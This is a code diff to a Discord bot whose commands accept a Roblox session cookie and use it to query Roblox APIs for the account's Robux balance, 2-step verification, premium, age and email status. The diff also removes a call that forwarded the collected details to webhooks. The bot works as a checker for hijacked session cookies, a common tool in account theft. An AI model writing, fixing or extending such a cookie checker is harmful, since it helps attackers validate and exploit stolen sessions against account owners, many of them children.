@@ -1,5 +1,7 @@
 import os
 import discord
+import requests
+from discord.ext import commands
 from discord import Activity, ActivityType, Embed, Intents
 from requests import get
 from discord.ext import commands
@@ -102,11 +104,9 @@ async def vcr(ctx, cookie=None):
         embedVar.add_field(name="Error: ", value=f'```{response.text}```', inline=False)
         await ctx.send(embed=embedVar)
 
-import discord
-import requests
-from discord.ext import commands
 
-@settings.client.command(name="full", description="Get full account details using a Roblox cookie")
+
+@settings.tree.command(name="full", description="Get full account details using a Roblox cookie")
 async def full(interaction: discord.Interaction, cookie: str):
     await interaction.response.defer()
 
@@ -115,7 +115,7 @@ async def full(interaction: discord.Interaction, cookie: str):
     # Check authentication
     response = requests.get('https://users.roblox.com/v1/users/authenticated', headers=headers)
     
-    if response.status_code == 200 and '"id":' in response.text:
+    if response.status_code == 200 and 'id' in response.json():
         user_id = response.json().get('id')
 
         robux = requests.get(f'https://economy.roblox.com/v1/users/{user_id}/currency', headers=headers).json().get('robux', 'N/A')
@@ -162,12 +162,12 @@ async def full(interaction: discord.Interaction, cookie: str):
                        f'{account_2step} 2-Step Verification | {account_has_premium} Premium | {account_above_13} Above 13 | '
                        f'{account_email_verified} Email]')
 
-        log(log_message)
-        await send_to_webhooks(log_message)
+        print(log_message)  # Use a proper logging function if needed
 
         await interaction.followup.send("Account details retrieved successfully.")
     else:
         await interaction.followup.send("Invalid cookie or unable to retrieve account details.")
+
 
         
 def run_bot():
